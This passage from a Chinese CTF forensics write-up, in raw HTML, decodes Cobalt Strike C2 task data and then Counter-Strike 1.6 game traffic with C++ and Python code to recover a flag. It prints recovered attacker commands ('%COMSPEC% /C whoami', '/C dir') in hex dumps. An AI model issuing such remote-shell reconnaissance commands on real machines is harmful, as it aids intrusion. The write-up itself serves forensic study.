</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>数据总长度为</span><span class=err>：</span><span class=mi>48</span>
</span></span><span class=line><span class=cl><span class=o>================================================================================</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>counter</span><span class=p>:</span> <span class=mi>1734332826</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>任务返回长度</span><span class=p>:</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>任务输出类型</span><span class=p>:</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=mi>00000000</span><span class=p>:</span> <span class=mi>67</span> <span class=mi>5</span><span class=n>F</span> <span class=n>D1</span> <span class=mi>9</span><span class=n>A</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>10</span>  <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>04</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>08</span>  <span class=n>g_</span><span class=o>..............</span>
</span></span><span class=line><span class=cl><span class=mi>00000010</span><span class=p>:</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>64</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>5</span><span class=n>A</span>  <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span>  <span class=o>...</span><span class=n>d</span><span class=o>...</span><span class=n>ZAAAAAAAA</span>
</span></span><span class=line><span class=cl><span class=kc>None</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>数据总长度为</span><span class=err>：</span><span class=mi>64</span>
</span></span><span class=line><span class=cl><span class=o>================================================================================</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>counter</span><span class=p>:</span> <span class=mi>1734332874</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>任务返回长度</span><span class=p>:</span> <span class=mi>37</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>任务输出类型</span><span class=p>:</span> <span class=mi>78</span>
</span></span><span class=line><span class=cl><span class=mi>00000000</span><span class=p>:</span> <span class=mi>67</span> <span class=mi>5</span><span class=n>F</span> <span class=n>D1</span> <span class=n>CA</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>25</span>  <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>4</span><span class=n>E</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>1</span><span class=n>D</span>  <span class=n>g_</span><span class=o>.....%...</span><span class=n>N</span><span class=o>....</span>
</span></span><span class=line><span class=cl><span class=mi>00000010</span><span class=p>:</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>09</span> <span class=mi>25</span> <span class=mi>43</span> <span class=mi>4</span><span class=n>F</span> <span class=mi>4</span><span class=n>D</span>  <span class=mi>53</span> <span class=mi>50</span> <span class=mi>45</span> <span class=mi>43</span> <span class=mi>25</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>  <span class=o>....%</span><span class=n>COMSPEC</span><span class=o>%...</span>
</span></span><span class=line><span class=cl><span class=mi>00000020</span><span class=p>:</span> <span class=mi>0</span><span class=n>A</span> <span class=mi>20</span> <span class=mi>2</span><span class=n>F</span> <span class=mi>43</span> <span class=mi>20</span> <span class=mi>77</span> <span class=mi>68</span> <span class=mi>6</span><span class=n>F</span>  <span class=mi>61</span> <span class=mi>6</span><span class=n>D</span> <span class=mi>69</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span>  <span class=o>.</span> <span class=o>/</span><span class=n>C</span> <span class=n>whoami</span><span class=o>..</span><span class=n>AAA</span>
</span></span><span class=line><span class=cl><span class=kc>None</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>数据总长度为</span><span class=err>：</span><span class=mi>64</span>
</span></span><span class=line><span class=cl><span class=o>================================================================================</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>counter</span><span class=p>:</span> <span class=mi>1734332876</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>任务返回长度</span><span class=p>:</span> <span class=mi>34</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>任务输出类型</span><span class=p>:</span> <span class=mi>78</span>
</span></span><span class=line><span class=cl><span class=mi>00000000</span><span class=p>:</span> <span class=mi>67</span> <span class=mi>5</span><span class=n>F</span> <span class=n>D1</span> <span class=n>CC</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>22</span>  <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>4</span><span class=n>E</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>1</span><span class=n>A</span>  <span class=n>g_</span><span class=o>.....</span><span class=s2>&#34;...N....</span>
</span></span><span class=line><span class=cl><span class=mi>00000010</span><span class=p>:</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>09</span> <span class=mi>25</span> <span class=mi>43</span> <span class=mi>4</span><span class=n>F</span> <span class=mi>4</span><span class=n>D</span>  <span class=mi>53</span> <span class=mi>50</span> <span class=mi>45</span> <span class=mi>43</span> <span class=mi>25</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>  <span class=o>....%</span><span class=n>COMSPEC</span><span class=o>%...</span>
</span></span><span class=line><span class=cl><span class=mi>00000020</span><span class=p>:</span> <span class=mi>07</span> <span class=mi>20</span> <span class=mi>2</span><span class=n>F</span> <span class=mi>43</span> <span class=mi>20</span> <span class=mi>64</span> <span class=mi>69</span> <span class=mi>72</span>  <span class=mi>00</span> <span class=mi>00</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span>  <span class=o>.</span> <span class=o>/</span><span class=n>C</span> <span class=nb>dir</span><span class=o>..</span><span class=n>AAAAAA</span>
</span></span><span class=line><span class=cl><span class=kc>None</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>数据总长度为</span><span class=err>：</span><span class=mi>48</span>
</span></span><span class=line><span class=cl><span class=o>================================================================================</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>counter</span><span class=p>:</span> <span class=mi>1734332896</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>任务返回长度</span><span class=p>:</span> <span class=mi>19</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>任务输出类型</span><span class=p>:</span> <span class=mi>53</span>
</span></span><span class=line><span class=cl><span class=mi>00000000</span><span class=p>:</span> <span class=mi>67</span> <span class=mi>5</span><span class=n>F</span> <span class=n>D1</span> <span class=n>E0</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>13</span>  <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>35</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>0</span><span class=n>B</span>  <span class=n>g_</span><span class=o>........</span><span class=mf>.5</span><span class=o>....</span>
</span></span><span class=line><span class=cl><span class=mi>00000010</span><span class=p>:</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>01</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>03</span>  <span class=mi>2</span><span class=n>E</span> <span class=mi>5</span><span class=n>C</span> <span class=mi>2</span><span class=n>A</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span> <span class=mi>41</span>  <span class=o>.........</span>\<span class=o>*</span><span class=n>AAAAA</span>
</span></span><span class=line><span class=cl><span class=kc>None</span></span></span></code></pre></td></tr></table></div></div><p>仔细观察以上数据其实可以发现攻击者一共就要求执行了<code>whoami</code>和<code>dir</code>这两个命令</p><p>然后我们将解密得到的流量包文件保存为<code>secret.pcapng</code>，打开翻看，发现主要是UDP流量</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250227214805641.png alt=/posts/f002407/imgs/image-20250227214805641.png height=1528 width=2560></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250227214831328.png alt=/posts/f002407/imgs/image-20250227214831328.png height=1300 width=1786></p><p>赛后和师傅们交流后知道了是<code>CS(反恐精英)1.6</code>的流量，这里的出题思路参考自 <a href=https://www.anquanke.com/post/id/261339#h2-0 target=_blank rel="external nofollow noopener noreferrer">2021L3HCTF Lambda</a></p><p>这也呼应了题目名(CSCS)，CS流量里套了一个<code>CS(反恐精英)1.6</code>流量</p><blockquote><p><a href=https://github.com/rehlds/ReHLDS/ target=_blank rel="external nofollow noopener noreferrer">ReHLDS</a> 是一个 C++ 开源项目，它是 HLDS（Half-Life Dedicated Server）的一个优化版本</p><p>专门用来搭建 反恐精英1.6（CS 1.6）等基于 Half-Life 引擎的游戏服务器。</p></blockquote><p>但是这道题没有2021L3HCTF那题那么复杂，因为这里的数据包带的数据都比较短</p><p>因此这里直接一个个包解码过去就行，也不用根据解密后数据的长度进行分块处理</p><p>首先把解密的CPP代码在Linux下编译成.so文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=k>extern</span> <span class=s>&#34;C&#34;</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=nf>_LongSwap</span><span class=p>(</span><span class=kt>int</span> <span class=n>l</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>res</span> <span class=o>=</span> <span class=n>__builtin_bswap32</span><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>l</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=p>(</span><span class=n>res</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>mungify_table2</span><span class=p>[]</span> <span class=o>=</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0xED</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mh>0x1B</span><span class=p>,</span> <span class=mh>0xCA</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x9B</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mh>0x4A</span><span class=p>,</span> <span class=mh>0xF1</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0xC7</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mh>0xB5</span><span class=p>,</span> <span class=mh>0x8E</span><span class=p>,</span> <span class=mh>0xDF</span><span class=p>,</span> <span class=mh>0xA0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=nf>COM_UnMunge2</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>data</span><span class=p>,</span> <span class=kt>int</span> <span class=n>len</span><span class=p>,</span> <span class=kt>int</span> <span class=n>seq</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>mungelen</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=o>*</span><span class=n>pc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>mungelen</span> <span class=o>=</span> <span class=n>len</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>mungelen</span> <span class=o>/=</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>mungelen</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>pc</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>data</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=n>c</span> <span class=o>=</span> <span class=o>*</span><span class=n>pc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>c</span> <span class=o>^=</span> <span class=n>seq</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>p</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=o>*</span><span class=n>p</span><span class=o>++</span> <span class=o>^=</span> <span class=p>(</span><span class=mh>0xa5</span> <span class=o>|</span> <span class=p>(</span><span class=n>j</span> <span class=o>&lt;&lt;</span> <span class=n>j</span><span class=p>)</span> <span class=o>|</span> <span class=n>j</span> <span class=o>|</span> <span class=n>mungify_table2</span><span class=p>[(</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x0f</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>c</span> <span class=o>=</span> <span class=n>_LongSwap</span><span class=p>(</span><span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>c</span> <span class=o>^=</span> <span class=o>~</span><span class=n>seq</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=o>*</span><span class=n>pc</span> <span class=o>=</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>g++ -shared -fPIC -o a.so a.cpp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># g++：使用 C++ 编译器进行编译。</span>
</span></span><span class=line><span class=cl><span class=c1># -shared：指示编译器生成共享库（.so 文件）。</span>
</span></span><span class=line><span class=cl><span class=c1># -fPIC：生成位置无关代码（Position Independent Code），这是生成共享库所必需的。</span>
</span></span><span class=line><span class=cl><span class=c1># -o libcom_unmunge.so：指定输出文件名为 libcom_unmunge.so。</span>
</span></span><span class=line><span class=cl><span class=c1># com_unmunge.cpp：源代码文件名。</span></span></span></code></pre></td></tr></table></div></div><p>Linux下输入以上命令即可编译得到 a.so</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>tshark_path</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;tshark&#34;</span>
</span></span><span class=line><span class=cl><span class=n>lib</span><span class=o>=</span><span class=n>CDLL</span><span class=p>(</span><span class=s1>&#39;./a.so&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>COM_UnMunge</span><span class=o>=</span><span class=n>lib</span><span class=o>.</span><span class=n>COM_UnMunge2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>command</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=n>tshark_path</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-r&#39;</span><span class=p>,</span> <span class=s2>&#34;secret.pcapng&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-Y&#39;</span><span class=p>,</span> <span class=s1>&#39;udp&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-T&#39;</span><span class=p>,</span> <span class=s1>&#39;json&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;ip.src&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;ip.dst&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;data.data&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>command</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>text</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>json_out</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>res</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>packet</span> <span class=ow>in</span> <span class=n>json_out</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>layers</span> <span class=o>=</span> <span class=n>packet</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;_source&#39;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;layers&#39;</span><span class=p>,</span> <span class=p>{})</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_src</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;ip.src&#39;</span><span class=p>,</span> <span class=p>[</span><span class=kc>None</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_dst</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;ip.dst&#39;</span><span class=p>,</span> <span class=p>[</span><span class=kc>None</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;data.data&#39;</span><span class=p>,</span> <span class=p>[</span><span class=kc>None</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=nb>all</span><span class=p>([</span><span class=n>ip_src</span><span class=p>,</span> <span class=n>ip_dst</span><span class=p>,</span> <span class=n>data</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            <span class=n>bytes_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>enc_data</span> <span class=o>=</span> <span class=n>bytes_data</span><span class=p>[</span><span class=mi>8</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>            <span class=n>seq</span> <span class=o>=</span> <span class=n>bytes_data</span><span class=p>[:</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>buf</span><span class=o>=</span><span class=n>create_string_buffer</span><span class=p>(</span><span class=n>enc_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>COM_UnMunge</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>enc_data</span><span class=p>),</span><span class=n>seq</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>buf</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span> <span class=c1># 这里要先把 C-String 类型转为 bytes 类型</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] </span><span class=si>{</span><span class=n>ip_src</span><span class=si>}</span><span class=s2> ==&gt; </span><span class=si>{</span><span class=n>ip_dst</span><span class=si>}</span><span class=s2>:</span><span class=se>\n</span><span class=si>{</span><span class=nb>bytes</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;DASCTF&#39;</span> <span class=ow>in</span> <span class=n>buf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[x] </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p>最后Linux下运行以上代码即可得到最后的flag：<code>DASCTF{C0UnT3R_S7R1K3_4nD_C0BaLt_57RIK3_4LL_FUN}</code></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250228152411061.png alt=/posts/f002407/imgs/image-20250228152411061.png height=628 width=1115></p><h2 class=heading-element id=线下决赛><span>线下决赛</span>
<a href=#%e7%ba%bf%e4%b8%8b%e5%86%b3%e8%b5%9b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=题目名称-只留清白在人间><span>题目名称 只留清白在人间</span>
